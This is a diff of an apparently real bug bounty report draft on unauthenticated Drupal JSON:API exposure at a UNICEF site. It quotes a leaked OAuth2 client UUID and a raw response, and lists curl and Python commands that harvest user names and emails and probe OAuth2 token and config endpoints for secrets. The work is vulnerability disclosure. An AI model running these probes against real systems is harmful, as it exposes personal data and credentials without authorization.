@@ -180,15 +180,38 @@ All three components are past end-of-life and receive no security patches.
    targeted credential stuffing or password reset attacks against UNICEF systems that
    share the same email directory (Outlook 365, VPN portals, SSO).
 
-**Unconfirmed — requires Pi verification before reporting (see Section 6):**
-4. **OAuth2 Credential Exposure:** The schema exposes `oauth2_server_client` and
-   `oauth2_server_token` endpoints. If these return client secrets or active bearer
-   tokens without authentication, impact escalates to High/Critical — an attacker
-   could impersonate API consumers or hijack active sessions.
+**Confirmed (additional):**
+4. **OAuth2 Client UUID Disclosure via JSON:API `meta.omitted`:** Probing
+   `/en/jsonapi/oauth2_server_client/oauth2_server_client` unauthenticated returns
+   HTTP 200 with `data: []` but leaks the OAuth2 client UUID in the `meta.omitted`
+   section (Drupal's partial-result disclosure mechanism). Confirmed leaked UUID:
+   `8cf614c1-7422-477b-952b-bcf1642439c5`. An attacker can reconstruct the full
+   client URL: `ram.unicef.org/en/jsonapi/oauth2_server_client/oauth2_server_client/8cf614c1-7422-477b-952b-bcf1642439c5`.
+   The actual client secret is not returned — but the existence and UUID of each
+   OAuth2 client is disclosed without authentication.
+
+   Raw response excerpt:
+   ```json
+   {
+     "data": [],
+     "meta": {
+       "omitted": {
+         "detail": "Some resources have been omitted because of insufficient authorization.",
+         "links": {
+           "item--5PGyAhH": {
+             "href": "http://ram.unicef.org/en/jsonapi/oauth2_server_client/oauth2_server_client/8cf614c1-7422-477b-952b-bcf1642439c5",
+             "meta": {
+               "detail": "The current user is not allowed to GET the selected resource. The 'administer oauth2 server' permission is required."
+             }
+           }
+         }
+       }
+     }
+   }
+   ```
 
 5. **Internal Configuration Exposure:** `config_pages--api_config` and
-   `config_pages--api_modules` may contain API keys, internal endpoint URLs, or
-   integration credentials.
+   `config_pages--api_modules` endpoints listed in schema — content not yet probed.
 
 ---
 
@@ -242,49 +265,64 @@ Base Score: 7.5 (High)
 
 ## Section 6 — Pre-Submission Verification Checklist (Run on Pi)
 
-Before submitting, run these from your Raspberry Pi to complete the evidence package:
-
 ```bash
-# 1. Full user count + save sample
-curl -s "https://ram.unicef.org/en/jsonapi/user/user?page[limit]=50" \
+# Create evidence directory first
+mkdir -p ~/bug-bounty-hunting-/results/unicef.org/findings/
+
+cd ~/bug-bounty-hunting-
+
+# 1. Full user count + sample — save response to file first, then parse
+curl -s "https://ram.unicef.org/en/jsonapi/user/user?page%5Blimit%5D=50" \
   -H "Accept: application/vnd.api+json" \
-  | python3 -c "
-import sys, json
-d = json.loads(sys.stdin.read())
+  > /tmp/jsonapi-users.json
+
+python3 - <<'PYEOF'
+import json
+with open('/tmp/jsonapi-users.json') as f:
+    d = json.load(f)
 data = d.get('data', [])
-print(f'Total exposed: {d.get(\"meta\",{}).get(\"count\",\"N/A\")}')
-print(f'This page: {len(data)}')
+meta = d.get('meta', {})
+print(f'Total (meta.count): {meta.get("count", "N/A")}')
+print(f'Users this page: {len(data)}')
+print()
 for u in data[:5]:
     a = u.get('attributes', {})
-    print(f'  {a.get(\"name\",\"\")} | {a.get(\"mail\",\"\")}')
-" | tee results/unicef.org/findings/poc-user-count.txt
+    print(f'  name={a.get("name","")} | mail={a.get("mail","")} | uuid={u["id"][:8]}...')
+PYEOF
 
-# 2. OAuth2 client probe (HIGH IMPACT if returns secrets)
-curl -s "https://ram.unicef.org/en/jsonapi/oauth2_server_client/oauth2_server_client" \
-  -H "Accept: application/vnd.api+json" -w "\nHTTP:%{http_code}" \
-  | tee results/unicef.org/findings/poc-oauth2-client.txt
+cp /tmp/jsonapi-users.json results/unicef.org/findings/poc-user-count.json
 
-# 3. OAuth2 token probe (CRITICAL if returns bearer tokens)
+# 2. OAuth2 token probe (check if active tokens leak)
 curl -s "https://ram.unicef.org/en/jsonapi/oauth2_server_token/oauth2_server_token" \
-  -H "Accept: application/vnd.api+json" -w "\nHTTP:%{http_code}" \
-  | tee results/unicef.org/findings/poc-oauth2-token.txt
+  -H "Accept: application/vnd.api+json" \
+  > /tmp/oauth2-token.json
+echo "HTTP status:" $(curl -so /dev/null -w "%{http_code}" \
+  "https://ram.unicef.org/en/jsonapi/oauth2_server_token/oauth2_server_token" \
+  -H "Accept: application/vnd.api+json")
+python3 -c "import json,sys; d=json.load(open('/tmp/oauth2-token.json')); print('data count:', len(d.get('data',[])), '| omitted:', bool(d.get('meta',{}).get('omitted')))"
+cp /tmp/oauth2-token.json results/unicef.org/findings/poc-oauth2-token.json
 
-# 4. API config probe
+# 3. API config probe
 curl -s "https://ram.unicef.org/en/jsonapi/config_pages/api_config" \
-  -H "Accept: application/vnd.api+json" -w "\nHTTP:%{http_code}" \
-  | tee results/unicef.org/findings/poc-api-config.txt
+  -H "Accept: application/vnd.api+json" \
+  > /tmp/api-config.json
+echo "HTTP status:" $(curl -so /dev/null -w "%{http_code}" \
+  "https://ram.unicef.org/en/jsonapi/config_pages/api_config" \
+  -H "Accept: application/vnd.api+json")
+python3 -c "import json; d=json.load(open('/tmp/api-config.json')); print('data count:', len(d.get('data',[])), '| omitted:', bool(d.get('meta',{}).get('omitted')))"
+cp /tmp/api-config.json results/unicef.org/findings/poc-api-config.json
 
-# 5. Save schema for report attachment
+# 4. Save schema
 curl -s "https://ram.unicef.org/en/jsonapi" \
   -H "Accept: application/vnd.api+json" \
-  | python3 -m json.tool \
   > results/unicef.org/findings/poc-schema-full.json
+echo "Schema saved: $(wc -c < results/unicef.org/findings/poc-schema-full.json) bytes"
 ```
 
-**Decision gate after running above:**
-- If OAuth2 probe returns HTTP 200 with client/secret fields → **upgrade to High, expand Section 3 impact, submit immediately**
-- If OAuth2 probe returns HTTP 403/401 → **submit at Medium (user enumeration only)**
-- If OAuth2 probe returns HTTP 200 but data is empty → **submit at Medium, note the exposure surface**
+**Decision gate:**
+- oauth2_server_token returns `data:[...]` with content → **High — add to report before submitting**
+- oauth2_server_token returns `data:[]` with omitted → **Medium — UUID leak only, submit as-is**
+- Any probe returns actual API keys/secrets → **Critical — submit same day**
 
 ---
 
